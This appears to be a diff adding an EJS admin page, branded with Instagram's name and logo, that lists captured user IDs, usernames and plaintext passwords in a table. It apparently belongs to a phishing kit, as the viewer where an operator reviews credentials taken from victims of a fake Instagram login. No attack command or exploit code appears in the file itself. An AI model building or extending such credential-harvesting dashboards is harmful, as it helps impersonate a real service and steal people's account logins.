@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Instagram Database</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Simple scrollbar styling for webkit browsers */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background-color: #333;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body class="bg-black text-white min-h-screen font-sans">
+    <div class="container mx-auto px-4 py-8">
+        <div class="flex items-center justify-between mb-8">
+            <img src="/logo.png" alt="Instagram Logo" class="h-10">
+            <h2 class="text-2xl font-semibold text-gray-300">Admin Panel</h2>
+        </div>
+
+        <div class="bg-[#121212] border border-[#363636] rounded-lg shadow-lg overflow-hidden">
+            <div class="px-6 py-4 border-b border-[#363636]">
+                <h3 class="text-lg font-medium leading-6 text-gray-100">User Credentials</h3>
+            </div>
+            <div class="overflow-x-auto">
+                <table class="min-w-full divide-y divide-[#363636]">
+                    <thead class="bg-[#1a1a1a]">
+                        <tr>
+                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">
+                                ID
+                            </th>
+                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">
+                                Username
+                            </th>
+                            <th scope="col" class="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">
+                                Password
+                            </th>
+                        </tr>
+                    </thead>
+                    <tbody class="bg-[#121212] divide-y divide-[#363636]">
+                        <% if(users.length > 0) { %>
+                            <% users.forEach(user => { %>
+                                <tr>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-200">
+                                        <%= user.id %>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
+                                        <%= user.username %>
+                                    </td>
+                                    <td class="px-6 py-4 whitespace-nowrap text-sm text-red-500 font-semibold">
+                                        <%= user.password %>
+                                    </td>
+                                </tr>
+                            <% }); %>
+                        <% } else { %>
+                            <tr>
+                                <td colspan="3" class="px-6 py-4 text-center text-sm text-gray-500">
+                                    No user data found.
+                                </td>
+                            </tr>
+                        <% } %>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <footer class="text-center text-xs text-gray-600 mt-8">
+            <p>&copy; 2025 Instagram Admin Panel.</p>
+        </footer>
+    </div>
+</body>
+</html>
